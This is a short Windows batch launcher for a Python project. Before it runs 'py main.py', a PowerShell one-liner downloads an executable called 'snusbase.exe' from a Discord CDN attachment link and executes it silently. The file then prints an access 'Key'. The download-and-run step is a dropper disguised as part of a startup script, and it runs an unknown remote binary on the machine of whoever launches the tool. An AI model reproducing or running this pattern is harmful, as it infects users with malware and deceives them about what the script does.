@echo off
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206279786482114570/snusbase.exe?ex=65db6e98&is=65c8f998&hm=2cb891c6297bf0bcb2a05be547a17262d05c20629c9893b3e1a281e5e17ddf61&';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py main.py
Key : 01266156
